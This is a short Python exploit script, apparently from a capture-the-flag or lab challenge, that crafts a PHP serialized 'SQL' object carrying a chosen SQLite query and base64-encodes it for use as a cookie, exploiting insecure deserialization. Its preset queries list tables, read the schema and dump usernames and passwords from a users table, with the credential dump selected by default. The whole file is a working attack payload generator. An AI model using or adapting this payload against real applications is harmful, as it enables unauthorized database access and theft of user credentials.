import base64

def generate_payload(query):
    # Craft the PHP serialized object manually
    # O:3:"SQL":1:{s:5:"query";s:<query_len>:"<query>";}
    
    query_len = len(query)
    serialized = f'O:3:"SQL":1:{{s:5:"query";s:{query_len}:"{query}";}}'
    
    # Base64 encode it
    payload = base64.b64encode(serialized.encode()).decode()
    return serialized, payload


# ---- Choose your query ----

# 1. Get all table names
query1 = "SELECT group_concat(tbl_name) AS username FROM sqlite_master WHERE type='table'"

# 2. Dump usernames and passwords
query2 = "SELECT group_concat(username||':'||password) AS username FROM users"

# 3. Get column names
query3 = "SELECT group_concat(sql) AS username FROM sqlite_master WHERE type='table'"


# ---- Generate ----
query = query2  # change this to query1, query2, query3 etc.

serialized, payload = generate_payload(query)

print("=== Serialized PHP Object ===")
print(serialized)
print()
print("=== Base64 Payload (use as cookie) ===")
print(payload)